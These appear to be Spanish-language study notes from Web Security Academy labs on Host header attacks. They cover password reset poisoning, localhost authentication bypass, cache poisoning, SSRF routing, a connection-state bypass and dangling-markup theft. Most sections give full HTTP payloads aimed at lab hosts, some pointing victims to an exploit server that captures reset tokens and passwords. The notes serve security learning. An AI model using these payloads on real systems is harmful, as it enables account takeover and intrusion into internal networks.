
---
Tags: #web-security #host-header-injection #ssrf #cache-poisoning #password-reset-poisoning #account-takeover #dangling-markup #bypass #authentication-bypass #burp-suite #burp-intruder #burp-repeater #burp-collaborator #exploit-server #http-headers #http-vulnerabilities  #access-control #parsing-discrepancies #connection-state-bypass #host

---
## Índice

- [[#Introducción: La falacia de la confianza en el Host]]
    
- [[#Herramientas y Conceptos Clave]]
    
- [[#Técnica 1: Poisoning Básico en Reseteo de Contraseña]]
    
- [[#Técnica 2: Bypass de Autenticación por Cabecera Host]]
    
- [[#Técnica 3: Web Cache Poisoning por Petición Ambigua]]
	
- [[#SSRF via Host Header Routing]]
    
- [[#SSRF via Request Parsing (URL Absoluta)]]
    
- [[#Bypass de Validación por Estado de Conexión (Connection State)]]
    
- [[#Password Reset Poisoning via Dangling Markup]]
    
- [[#Tabla Resumen de Técnicas]]
---

## Introducción: La falacia de la confianza en el Host

La vulnerabilidad raíz de todos estos ataques reside en una suposición errónea por parte de los desarrolladores: **Confiar en que la cabecera `Host` es inmutable y verídica.**

En la práctica, la cabecera `Host` es controlada completamente por el usuario (el atacante). Si el servidor utiliza este valor para generar enlaces, importar scripts o tomar decisiones de enrutamiento sin validación, tenemos un vector de ataque.

> [!TIP] **La Regla de Oro de la Detección** Si modificas la cabecera `Host` en una petición y ves ese valor **reflejado** en la respuesta (enlaces de reseteo, cabeceras `Location`, redirecciones 301/302 o importaciones de scripts src), estás ante una **vulnerabilidad explotable**.

---

## Herramientas y Conceptos Clave

Para entender mis explicaciones, definamos las herramientas que has utilizado en tus PoC:

- **Burp Suite (Repeater/Intruder):** Tu navaja suiza. Usada para interceptar la petición y modificar manualmente las cabeceras HTTP.
    
- **Exploit Server:** En los laboratorios (y en la vida real, tu servidor VPS controlado), esta es la máquina que recibe las conexiones de las víctimas.
    
    - _Uso:_ Simular el dominio malicioso. Cuando inyectas `Host: mi-exploit.com`, el objetivo es que la víctima o el servidor interno se conecten aquí para que puedas leer sus tokens en los **Access Logs**.
        
- **Burp Collaborator:** Similar al Exploit Server, pero usado específicamente para detectar interacciones fuera de banda (OOB) como resoluciones DNS o conexiones HTTP invisibles (ciegas).
    

---

## Técnica 1: Poisoning Básico en Reseteo de Contraseña

Esta es la técnica más clásica y devastadora contra la lógica de negocio.

### 🔍 Concepto y Descubrimiento

El servidor necesita enviar un email al usuario con un enlace para resetear su contraseña. Como el servidor a menudo no sabe su propio nombre de dominio "público" (especialmente tras balanceadores de carga), coge el valor de la cabecera `Host` de la petición entrante para construir la URL del enlace: `https://{Host_Header}/reset-token`.

### ⚔️ Explotación (Análisis PoC)

En tu ejemplo, hemos detectado que la ruta `/forgot-password` es vulnerable.

1. **Interceptamos** la petición de reseteo de contraseña para la víctima (`carlos`).
    
2. **Manipulamos** el `Host` apuntando a nuestro servidor de ataque (`exploit-0adb...`).
    

**Tu Payload:**

```HTTP
POST /forgot-password HTTP/2
Host: exploit-0adb00810357a11d815f163601c10018.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=iJjOtFGaZShGqaGbmzYNNhxeXKciAMoE&username=carlos
```

**¿Qué ocurre en el Backend?** El servidor genera el email:

> "Hola Carlos, haz clic aquí para resetear: `https://exploit-0adb.../forgot-password?token=d1guc...`"

**El Robo (Access Logs):** Cuando Carlos (o su bot de correo) hace clic en el enlace, su navegador hace una petición GET a **TU** servidor, entregándote el token en bandeja de plata.

**Tu Log (Evidencia del éxito):**

Fragmento de código

```
10.0.3.161      2026-02-18 18:14:22 +0000 "GET /forgot-password?temp-forgot-password-token=d1gucqoyir4un37rz87imhg2kyzkjwqy HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim)..."
```

- **Impacto:** Account Takeover (ATO) total. Usamos ese token `d1guc...` en la web legítima para cambiar la contraseña de Carlos.
    

---

## Técnica 2: Bypass de Autenticación por Cabecera Host

A veces, la seguridad no está en la autenticación, sino en la "ubicación" percibida.

### 🔍 Concepto

Muchos paneles de administración o configuraciones de servidor web (como Apache o Nginx) tienen reglas del tipo:

- _"Permitir acceso a `/admin` SOLO si la petición viene de `localhost` o `127.0.0.1`"._
    

El error es confiar en que el `Host` header identifica quién hace la petición, cuando en realidad solo identifica **a quién va dirigida**.

### ⚔️ Explotación

Te encontraste con un panel `/admin` bloqueado para usuarios externos.

**Tu Payload:**

```HTTP
GET /admin/delete?username=carlos HTTP/2
Host: localhost
```

**Análisis:** El servidor recibe la petición. El middleware de seguridad lee `Host: localhost`, asume que la petición se ha originado internamente en la propia máquina (o que está dirigida al contexto local seguro) y **bypassea** la restricción de IP/Rango, permitiéndote borrar al usuario `carlos`.

> [!NOTE] Nota Profesional Esta técnica funciona muy bien en entornos de desarrollo expuestos o configuraciones por defecto de servidores web mal securizados.

---

## Técnica 3: Web Cache Poisoning por Petición Ambigua

Aquí entramos en ataques más complejos que involucran la infraestructura de caché (CDNs, Varnish, etc.).

### 🔍 Concepto

Este ataque explota discrepancias entre cómo el **Cache** y el **Servidor de Origen (Backend)** procesan peticiones con **múltiples cabeceras Host**.

- **El Caché:** A menudo mira solo la primera cabecera `Host` para determinar la "clave de caché" (dónde guardar la respuesta).
    
- **El Backend:** Puede ser perezoso o estar configurado diferente, y priorizar la **última** cabecera `Host` para generar contenido dinámico (como rutas absolutas de scripts).
    

### ⚔️ Explotación (Análisis de tu PoC)

Descubriste que al enviar dos cabeceras, podías desincronizar la lógica.

**Tu Payload:**

```HTTP
GET / HTTP/1.1
Host: 0a020074038161328525d22d007c0070.h1-web-security-academy.net  <-- (1) Visto por la Caché
Host: exploit-0a2800bc034e61f5852ad14701f00001.exploit-server.net    <-- (2) Usado por el Backend para generar HTML
```

**El flujo del ataque:**

1. **La Inyección:** Envías esta petición. El servidor de origen (confundido) usa el **segundo Host** para construir una etiqueta script: `<script src="https://exploit-0a28.../resources/js/tracking.js">`.
    
2. **El Envenenamiento:** La respuesta vuelve al sistema de Caché. El Caché ve el **primer Host** (legítimo) y dice: "Ok, esta es la respuesta válida para la página principal del sitio legítimo". Y la guarda.
    
3. **La Víctima:** Cuando un usuario normal entra a la web legítima, el caché le sirve esa respuesta guardada (envenenada). Su navegador intenta cargar el JS, pero lo carga desde **TU** servidor.
    
4. **Ejecución:** Si en tu servidor de exploit tienes un archivo `/resources/js/tracking.js` con código malicioso (`alert(1)` o robo de cookies), has logrado un XSS almacenado masivo.

---
## SSRF via Host Header Routing

Esta técnica explota arquitecturas donde un **Reverse Proxy** o **Load Balancer** decide a qué servidor interno enviar la petición basándose exclusivamente en la cabecera `Host`.

### 🔍 Concepto y Descubrimiento

En muchas redes corporativas, el servidor web público actúa como una puerta de enlace. Si recibe `Host: example.com`, lo envía al backend de la web. Pero, ¿qué pasa si recibe `Host: 192.168.0.228`? Si no está configurado para whitelistear dominios, podría intentar conectar ciegamente a esa IP interna.

> [!INFO] **Herramienta Clave: Burp Intruder**
> 
> Aquí es fundamental. Como no sabemos la IP interna, usamos Intruder para hacer un barrido (fuzzing) del último octeto de la IP (`192.168.0.X`).

### ⚔️ Explotación (Análisis de tu PoC)

En tu caso, detectaste que podías sondear la red interna.

1. **Reconocimiento:** Usaste **Burp Collaborator** en el Host header. Si el servidor hubiera hecho una consulta DNS a tu colaborador, confirmaría que el servidor intenta resolver y conectar a lo que pongas en el Host.
    
2. **Ataque:** Configuraste el Intruder para probar IPs desde `.1` a `.255`.
    
3. **Éxito:** La IP `192.168.0.228` respondió con un código **302 Found**, redirigiendo a `/admin`. Esto indica que encontraste un panel oculto no accesible desde fuera.
    

**Tu Payload Final:**

```HTTP
POST /admin/delete HTTP/2
Host: 192.168.0.228

csrf=iCXEemXLGT3OJ6TPxxOdCfwTRu3nFQ1b&username=carlos
```

- **Resultado:** El proxy frontend recibió la petición, vio la IP interna en el Host, y enrutó la petición directamente a ese servidor privado, saltándose los firewalls perimetrales.
    

---

## SSRF via Request Parsing (URL Absoluta)

Este es un caso clásico de discrepancia en el análisis del protocolo HTTP (HTTP Request Smuggling vibes).

### 🔍 Concepto

El estándar HTTP permite enviar la URL completa en la línea de petición (`GET https://sitio.com/ HTTP/1.1`) en lugar de solo la ruta (`GET / HTTP/1.1`).

Algunos servidores (o WAFs) validan la seguridad mirando la **línea de petición**, pero el enrutamiento real se hace mirando la cabecera **Host**. Si difieren, puedes engañar al sistema.

### ⚔️ Explotación (Análisis de tu PoC)

El servidor bloqueaba peticiones directas con `Host: 192.168.0.237`. La defensa estaba mirando la cabecera Host.

**Tu Bypass:**

```HTTP
GET https://0a4c008b04c741f78072c6100024009d.web-security-academy.net/admin/delete?csrf=... HTTP/2
Host: 192.168.0.237
Cookie: session=...
```

**Desglose Técnico:**

1. **Línea de petición (URL Absoluta):** Apunta al dominio legítimo (`0a4c...`). El WAF/Filtro ve esto y dice: "Ah, va al sitio correcto. Pase."
    
2. **Cabecera Host (Maliciosa):** Apunta a `192.168.0.237`.
    
3. **El Backend:** Ignora la línea de petición (porque confía en que el frontend ya filtró) y usa el `Host` header para enrutar internamente la petición al panel de administración privado.
    

---

## Bypass de Validación por Estado de Conexión (Connection State)

Esta es una técnica muy elegante que se aprovecha de la eficiencia de HTTP/1.1 (Keep-Alive) o HTTP/2.

### 🔍 Concepto

Para ahorrar recursos, los navegadores y servidores reutilizan la misma conexión TCP para enviar múltiples peticiones (`Connection: keep-alive`).

La vulnerabilidad ocurre cuando el servidor **valida la seguridad solo en la primera petición** de la conexión, asumiendo que el canal ya es "de confianza" para las siguientes.

### ⚔️ Explotación (Análisis de tu PoC)

Utilizaste la función "Send group in sequence" (Grupo de peticiones en secuencia) de Burp Suite.

**Paso 1: La "Apertura de Puerta" (Legítima)**

```HTTP
GET / HTTP/1.1
Host: web-security-academy.net  <-- Dominio válido
Connection: keep-alive
```

- El servidor valida el Host. Todo correcto. Abre/mantiene el socket TCP.
    

**Paso 2: El "Polizón" (Maliciosa)**

_Enviada inmediatamente por el mismo socket TCP._

```HTTP
GET /admin/delete?username=carlos HTTP/1.1
Host: 192.168.0.1             <-- IP Interna restringida
```

- Como la conexión ya estaba establecida y validada, el balanceador de carga no vuelve a verificar las reglas de Host para esta segunda petición y la deja pasar directamente al backend interno.
    

---

## Password Reset Poisoning via Dangling Markup

Llegamos a la joya de la corona. Un ataque que combina Host Header Injection con extracción de datos sin necesidad de XSS completo.

### 🔍 Concepto: Markup Colgante (Dangling Markup)

Cuando no puedes ejecutar JavaScript (XSS), puedes intentar "romper" el HTML para robar datos. La idea es inyectar una etiqueta incompleta (como `<img src='...`) que nunca se cierra. El navegador, en su intento de arreglar el HTML, se "come" todo el texto siguiente (incluyendo secretos) hasta encontrar una comilla de cierre, y lo envía como parte de la URL al atacante.

### ⚔️ Explotación (Análisis de tu PoC)

El servidor insertaba el nuevo password directamente en el cuerpo del correo, y reflejaba tu cabecera `Host` sin sanitizar antes del mensaje.

**Tu Payload:**

```HTTP
POST /forgot-password HTTP/2
Host: web-security-academy.net:'><a src="https://exploit-server.net
...
```

_(Nota el uso de `:'` para cerrar el contexto anterior y romper la URL)._

**El HTML Resultante (Email de la víctima):**

```HTML
<p>Please <a href='https://web-security-academy.net:'><a src="https://exploit-server.net/login'>click here</a> to login with your new password: YqZel8kFJ2</p>
```

**Interpretación del Navegador/Cliente de Correo:**

1. Encuentra `<a src="...`. Abre comillas dobles.
    
2. Busca el cierre de comillas dobles.
    
3. Todo lo que hay entre medio se convierte en la URL del enlace.
    
    - URL interpretada: `https://exploit-server.net/login'>click here</a> to login with your new password: YqZel8kFJ2</p><p>Thanks,<br/>Support team</p><i>...`
        
4. Cuando la víctima (o el escáner de seguridad del mail) intenta cargar ese recurso, envía esa URL monstruosa a tu servidor.
    

**Log de Acceso (Tu captura):**

Recibiste una petición GET con todo el contenido del email "colgando" en la URL, incluyendo `password: YTT1bQlxYP`. ¡Jaque mate!

---

## Tabla Resumen de Técnicas

Para finalizar tus apuntes en Obsidian, aquí tienes la tabla comparativa solicitada para referencia rápida.

|**Técnica**|**Vector de Ataque**|**Objetivo Principal**|**Señal de Alerta**|
|---|---|---|---|
|**Password Reset Poisoning**|Reflejo de Host en emails|Account Takeover (ATO)|Enlaces de email generados con Host header.|
|**Web Cache Poisoning**|Host múltiple / Ambigüedad|XSS Masivo / DoS|Respuesta 302 o carga de script varía con 2º Host.|
|**Auth Bypass (Local)**|`Host: localhost`|Acceso a Admin Panel|Error "Access denied (local only)".|
|**SSRF (Routing)**|`Host: IP_Interna`|Escaneo Red Interna|Tiempos de respuesta distintos o 302 a paneles internos.|
|**SSRF (Absoluta)**|URL Absoluta vs Host|Bypass de WAF/Filtros|Servidor acepta URL absoluta en línea de petición.|
|**Connection State**|Reuse TCP Socket|Bypass de Validación|Petición bloqueada sola, pero pasa si va tras una válida.|
|**Dangling Markup**|Inyección HTML sin XSS|Robo de datos (passwords)|HTML crudo en emails sin sanitización de `Host`.|